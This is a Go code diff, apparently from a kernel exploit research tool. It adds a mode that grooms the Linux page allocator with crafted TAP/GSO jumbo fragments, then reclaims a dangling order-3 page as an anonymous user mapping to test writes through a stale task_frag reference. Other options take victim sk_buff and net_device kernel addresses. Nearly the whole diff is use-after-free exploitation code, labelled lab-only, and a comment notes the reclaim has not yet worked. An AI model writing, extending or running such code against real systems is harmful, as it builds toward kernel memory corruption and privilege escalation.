@@ -25,6 +25,7 @@ const (
 	tunSetIFF    = 0x400454ca
 	tunSetSndBuf = 0x400454d4
 	needsCsum    = 1
+	mapPopulate  = 0x8000
 
 	ethLen     = 14
 	vlanLen    = 4
@@ -99,6 +100,10 @@ type cfg struct {
 	staleFragHdrLen     int
 	staleNaturalFrag    bool
 	staleNaturalOverlap bool
+	staleNaturalAnon    bool
+	staleAnonSize       int
+	staleAnonJumbos     int
+	staleAnonWait       time.Duration
 	staleSKB            uint64
 	staleDev            uint64
 	staleHeadFile       string
@@ -158,6 +163,10 @@ func parseCfg() cfg {
 	flag.IntVar(&c.staleFragHdrLen, "stale-frag-hdr-len", 70, "lab-only: linear header length requested for oversized fragment probes")
 	flag.BoolVar(&c.staleNaturalFrag, "stale-natural-frag", false, "use the address-independent jumbo-fragment geometry that naturally plants frags[0]")
 	flag.BoolVar(&c.staleNaturalOverlap, "stale-natural-overlap", false, "lab-only: reclaim the dangling natural-fragment page and verify a live skb payload overlap")
+	flag.BoolVar(&c.staleNaturalAnon, "stale-natural-anon", false, "lab-only: reclaim the dangling natural-fragment page as an anonymous mapping and verify a write through task_frag")
+	flag.IntVar(&c.staleAnonSize, "stale-anon-size", 64<<20, "lab-only: bytes of anonymous memory faulted while reclaiming the dangling page")
+	flag.IntVar(&c.staleAnonJumbos, "stale-anon-jumbos", 96, "lab-only: incomplete order-3 fragments released together before the anonymous reclaim")
+	staleAnonWaitMs := flag.Int("stale-anon-wait-ms", 32000, "lab-only: wait for the incomplete fragment queues to expire")
 	flag.Uint64Var(&c.staleSKB, "stale-groom-skb", 0, "lab-only: optional observed victim sk_buff address for calibration diagnostics")
 	flag.Uint64Var(&c.staleDev, "stale-groom-dev", 0, "lab-only: optional observed victim net_device address for calibration diagnostics")
 	flag.StringVar(&c.staleHeadFile, "stale-groom-head-file", "", "lab-only: two-stage mode; wait for a file containing the probed victim head address")
@@ -176,6 +185,7 @@ func parseCfg() cfg {
 	c.capture = time.Duration(*captureMs) * time.Millisecond
 	c.staleDelay = time.Duration(*staleDelayMs) * time.Millisecond
 	c.staleEach = time.Duration(*staleEachUS) * time.Microsecond
+	c.staleAnonWait = time.Duration(*staleAnonWaitMs) * time.Millisecond
 	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
 	if c.staleNaturalFrag {
 		applyStaleNaturalFrag(&c)
@@ -250,6 +260,22 @@ func parseCfg() cfg {
 	}
 	if c.staleNaturalOverlap && !c.staleNaturalFrag {
 		fmt.Fprintln(os.Stderr, "-stale-natural-overlap requires -stale-natural-frag")
+		os.Exit(1)
+	}
+	if c.staleNaturalAnon && !c.staleNaturalFrag {
+		fmt.Fprintln(os.Stderr, "-stale-natural-anon requires -stale-natural-frag")
+		os.Exit(1)
+	}
+	if c.staleNaturalAnon && c.staleNaturalOverlap {
+		fmt.Fprintln(os.Stderr, "-stale-natural-anon and -stale-natural-overlap are separate reclaim experiments")
+		os.Exit(1)
+	}
+	if c.staleAnonSize < 8<<20 || c.staleAnonSize > 1<<30 || c.staleAnonSize%4096 != 0 {
+		fmt.Fprintln(os.Stderr, "-stale-anon-size must be page-aligned and in 8 MiB..1 GiB")
+		os.Exit(1)
+	}
+	if c.staleAnonJumbos < 1 || c.staleAnonJumbos > 1024 || c.staleAnonWait < 0 || c.staleAnonWait > 2*time.Minute {
+		fmt.Fprintln(os.Stderr, "-stale-anon-jumbos must be 1..1024 and -stale-anon-wait-ms must be 0..120000")
 		os.Exit(1)
 	}
 	if c.staleOptions && c.egress && !c.staleNaturalFrag {
@@ -493,6 +519,7 @@ func waitForKernelAddresses(path string, timeout time.Duration) ([]uint64, error
 }
 
 func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
+	var anon []byte
 	if c.staleFragSeeds != 0 {
 		frame := staleFragSeedFrame(c.staleFragSeedLen, 0x73)
 		for i := 0; i < c.staleFragSeeds; i++ {
@@ -595,6 +622,62 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 
 	collectID := id
 	var overlapWant []byte
+	if c.staleNaturalAnon {
+		// Release packet-socket clones so the natural stale descriptor has
+		// dropped the order-3 page to refcount zero. Reclaim it first with an
+		// incomplete jumbo, then hold enough other order-3 fragments that their
+		// near-simultaneous expiry may drain the high-order per-CPU page list back
+		// to the buddy allocator. The anonymous faults test whether that is enough
+		// to split and reclaim the formerly compound page; current lab runs report
+		// marker_offset=-1, so this is a falsifiable allocator probe, not a proven
+		// transition.
+		cap.drain(c.staleDelay)
+		for i := 0; i < c.staleAnonJumbos; i++ {
+			middle, _, _ := staleNaturalOverlapFrames(c, id+1+uint16(i))
+			if err := writeTapGSO(tap, middle, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
+				false, 0, 0); err != nil {
+				return fmt.Errorf("stale-options: anonymous order-3 hold %d/%d: %w", i+1, c.staleAnonJumbos, err)
+			}
+		}
+		fmt.Printf("stale-options: natural-anon held_order3=%d expiry_wait=%s\n",
+			c.staleAnonJumbos, c.staleAnonWait)
+		time.Sleep(c.staleAnonWait)
+		var err error
+		anon, err = syscall.Mmap(-1, 0, c.staleAnonSize, syscall.PROT_READ|syscall.PROT_WRITE,
+			syscall.MAP_PRIVATE|syscall.MAP_ANON|mapPopulate)
+		if err != nil {
+			return fmt.Errorf("stale-options: populate anonymous reclaim mapping: %w", err)
+		}
+		// This mode intentionally retains the mapping through process exit. A
+		// later stage will make its host page reference stale, at which point an
+		// explicit munmap would itself be another unmatched put_page().
+		defer runtime.KeepAlive(anon)
+		for off := 0; off < len(anon); off += 4096 {
+			anon[off] = 0xa6
+		}
+		probeMarker := []byte("BENGSKY_TASK_FRAG_TO_ANON_93EF02A6")
+		probe := make([]byte, ethLen+len(probeMarker))
+		copy(probe[0:6], []byte{2, 0, 0, 0, 0, 1})
+		copy(probe[6:12], []byte{2, 0, 0, 0, 0, 2})
+		binary.BigEndian.PutUint16(probe[12:14], ethPExperiment)
+		copy(probe[14:], probeMarker)
+		if err := writeTap(tap, probe, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: anonymous reclaim marker: %w", err)
+		}
+		markerAt := -1
+		for off := 0; off < len(anon); off += 4096 {
+			end := min(off+512, len(anon))
+			if within := bytes.Index(anon[off:end], probeMarker); within >= 0 {
+				markerAt = off + within
+				break
+			}
+		}
+		fmt.Printf("stale-options: natural-anon bytes=%d held_order3=%d marker_offset=%d matched=%t\n",
+			len(anon), c.staleAnonJumbos, markerAt, markerAt >= 0)
+		if markerAt < 0 {
+			return errors.New("stale-options: dangling task_frag write did not reach the anonymous mapping")
+		}
+	}
 	if c.staleNaturalOverlap {
 		// The completed stale-options datagram is emitted as many small
 		// fragments on the lab's MTU-200 veth. The capture socket owns clones
